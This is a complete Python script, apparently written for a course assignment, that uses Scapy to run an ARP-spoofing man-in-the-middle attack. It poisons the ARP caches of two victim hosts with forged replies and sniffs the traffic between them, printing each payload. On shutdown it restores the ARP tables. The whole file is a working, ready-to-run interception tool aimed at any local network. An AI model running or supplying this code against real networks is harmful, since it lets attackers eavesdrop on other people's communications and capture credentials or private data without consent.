#!/usr/bin/env python3

import sys
import time
import os
import signal
import threading
from scapy.all import ARP, Ether, srp, sendp, sniff, conf, get_if_hwaddr, IP, Raw

# --- Configuration ---
# Based on the assignment, the attacker is on 'eth0'.
ATTACKER_INTERFACE = "eth0"
conf.verb = 0  # Make Scapy less verbose globally

# --- Global Variables for Targets and Attacker Info ---
# These will be populated in main()
victim1_ip_global = ""
victim2_ip_global = ""
victim1_mac_global = ""
victim2_mac_global = ""
attacker_mac_global = ""

# --- Threading Control ---
stop_event = threading.Event()  # Used to signal threads to stop
sniffer_thread_instance = None  # To hold the sniffer thread object

# --- Functions ---


def get_mac(ip_address):
    """
    Sends an ARP request to the given IP address and returns its MAC address.
    Uses the global ATTACKER_INTERFACE.
    """
    print(f"[*] Attempting to get MAC address for IP: {ip_address}")
    arp_request_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
    answered_packets, _ = srp(
        arp_request_packet, timeout=2, iface=ATTACKER_INTERFACE, verbose=False)

    if answered_packets:
        return answered_packets[0][1].hwsrc
    else:
        print(
            f"[!] Could not get MAC address for {ip_address}. Host may be down or unresponsive.")
        return None


def spoof_arp_cache(target_ip, target_mac, spoof_ip):
    """
    Sends a single spoofed ARP reply to the target.
    - target_ip: The IP address of the machine whose cache we want to poison.
    - target_mac: The MAC address of that target machine.
    - spoof_ip: The IP address that the attacker wants to impersonate for the target.
    Uses global ATTACKER_INTERFACE and attacker_mac_global.
    """
    packet = Ether(src=attacker_mac_global, dst=target_mac) / \
        ARP(hwsrc=attacker_mac_global, psrc=spoof_ip,
            hwdst=target_mac, pdst=target_ip,
            op=2)  # op=2 means ARP reply
    sendp(packet, iface=ATTACKER_INTERFACE, verbose=False)


def restore_arp_tables():
    """
    Restores the ARP tables of the two victim machines by sending legitimate ARP replies.
    Uses global variables for IPs and MACs.
    """
    print("\n[*] Restoring ARP tables...")
    # Restore for Victim 1: Tell Victim 1 the true MAC of Victim 2
    if victim1_ip_global and victim1_mac_global and victim2_ip_global and victim2_mac_global:
        restore_packet_v1 = Ether(src=victim2_mac_global, dst=victim1_mac_global) / \
            ARP(hwsrc=victim2_mac_global, psrc=victim2_ip_global,
                hwdst=victim1_mac_global, pdst=victim1_ip_global,
                op=2)
        sendp(restore_packet_v1, iface=ATTACKER_INTERFACE,
              count=4, inter=0.3, verbose=False)

        # Restore for Victim 2: Tell Victim 2 the true MAC of Victim 1
        restore_packet_v2 = Ether(src=victim1_mac_global, dst=victim2_mac_global) / \
            ARP(hwsrc=victim1_mac_global, psrc=victim1_ip_global,
                hwdst=victim2_mac_global, pdst=victim2_ip_global,
                op=2)
        sendp(restore_packet_v2, iface=ATTACKER_INTERFACE,
              count=4, inter=0.3, verbose=False)
        print("[*] ARP tables restored.")
    else:
        print("[!] Could not restore ARP tables: Missing IP/MAC information.")


def packet_sniffer_callback(packet):
    """
    Callback function for Scapy's sniff(). Processes captured packets.
    Prints IP source, destination, and payload if the packet is between the targets.
    """
    if not stop_event.is_set():  # Only process if we are not trying to stop
        if IP in packet:
            source_ip = packet[IP].src
            destination_ip = packet[IP].dst

            # Check if the packet is flowing between our two victim IPs
            is_v1_to_v2 = (
                source_ip == victim1_ip_global and destination_ip == victim2_ip_global)
            is_v2_to_v1 = (
                source_ip == victim2_ip_global and destination_ip == victim1_ip_global)

            if is_v1_to_v2 or is_v2_to_v1:
                payload_data = b''  # Default to empty bytes
                if Raw in packet:   # Check if there is a Raw layer (payload)
                    payload_data = packet[Raw].load
                # Output format: Received traffic from 192.168.124.20 to 192.168.124.10: b'Hi!'
                print(
                    f"Received traffic from {source_ip} to {destination_ip}: {payload_data!r}")


def start_packet_sniffing():
    """
    Starts the packet sniffing process in the current thread.
    Uses the global stop_event to allow for graceful shutdown.
    """
    print("[*] Starting packet sniffing...")
    # sniff() will block until stop_filter returns True or count is reached.
    # store=0 means we don't keep packets in memory, relying on the callback.
    sniff(iface=ATTACKER_INTERFACE,
          prn=packet_sniffer_callback,
          stop_filter=lambda p: stop_event.is_set(),  # Stop sniffing when event is set
          store=0)
    print("[*] Packet sniffing stopped.")


def signal_handler(sig, frame):
    """Handles Ctrl+C and other termination signals."""
    print(f"\n[!] Signal {sig} received. Shutting down gracefully...")
    stop_event.set()  # Signal all threads/loops to stop

    # The main thread will join the sniffer thread after the spoofing loop breaks.
    # Restoration and IP forwarding disable will happen in the main try/finally.


def main():
    global victim1_ip_global, victim2_ip_global, victim1_mac_global, victim2_mac_global
    global attacker_mac_global, ATTACKER_INTERFACE, sniffer_thread_instance

    # Register signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
    signal.signal(signal.SIGTERM, signal_handler)  # Termination signal

    # Check command line arguments
    if len(sys.argv) != 3:
        print("Error: Incorrect Usage!")
        print(f"Usage: python3 spoof_arp.py <victim1_ip> <victim2_ip>")
        sys.exit(1)

    victim1_ip_global = sys.argv[1]
    victim2_ip_global = sys.argv[2]

    print(f"Attacker Interface: {ATTACKER_INTERFACE}")
    print(f"Victim 1 IP: {victim1_ip_global}")
    print(f"Victim 2 IP: {victim2_ip_global}")

    # Get MAC addresses
    attacker_mac_global = get_if_hwaddr(ATTACKER_INTERFACE)
    if not attacker_mac_global:
        print(
            f"[!] Could not get MAC address for attacker interface {ATTACKER_INTERFACE}. Exiting.")
        sys.exit(1)
    print(f"Attacker MAC: {attacker_mac_global}")

    victim1_mac_global = get_mac(victim1_ip_global)
    victim2_mac_global = get_mac(victim2_ip_global)

    if not victim1_mac_global or not victim2_mac_global:
        print("[!] Failed to obtain MAC addresses for one or both victims. Exiting.")
        sys.exit(1)
    print(f"Victim 1 MAC: {victim1_mac_global}")
    print(f"Victim 2 MAC: {victim2_mac_global}")

    try:
        # Start packet sniffing in a separate thread
        sniffer_thread_instance = threading.Thread(
            target=start_packet_sniffing)
        # Allow main program to exit if this thread is still running
        sniffer_thread_instance.daemon = True
        sniffer_thread_instance.start()

        print("\n[*] Starting ARP spoofing loop... Press Ctrl+C to stop.")
        packets_sent_count = 0
        while not stop_event.is_set():
            spoof_arp_cache(victim1_ip_global,
                            victim1_mac_global, victim2_ip_global)
            spoof_arp_cache(victim2_ip_global,
                            victim2_mac_global, victim1_ip_global)
            packets_sent_count += 2
            # \r moves cursor to line start, end='' prevents newline. Updates in place.
            print(
                f"[*] ARP Spoofing Active. Packets Sent: {packets_sent_count}")

            # Sleep for a bit, but check stop_event frequently.
            # stop_event.wait returns True if event set, False on timeout.
            if stop_event.wait(timeout=2.0):  # Timeout is 2 seconds
                break  # Event was set, break from loop

    except Exception as e:
        # This catches unexpected errors during the main spoofing loop.
        print(f"\n[!] An unexpected error occurred: {e}")
    finally:
        print("\n[*] Initiating cleanup sequence...")
        # Signal stop_event again just in case it wasn't (e.g., loop broke due to error)
        if not stop_event.is_set():
            stop_event.set()

        # Wait for the sniffer thread to finish
        if sniffer_thread_instance and sniffer_thread_instance.is_alive():
            print("[*] Waiting for sniffer thread to complete...")
            sniffer_thread_instance.join(timeout=5.0)  # Wait up to 5 seconds
            if sniffer_thread_instance.is_alive():
                print("[!] Sniffer thread did not terminate gracefully.")

        restore_arp_tables()
        print("[*] Cleanup complete. Exiting.")


if __name__ == "__main__":
    main()
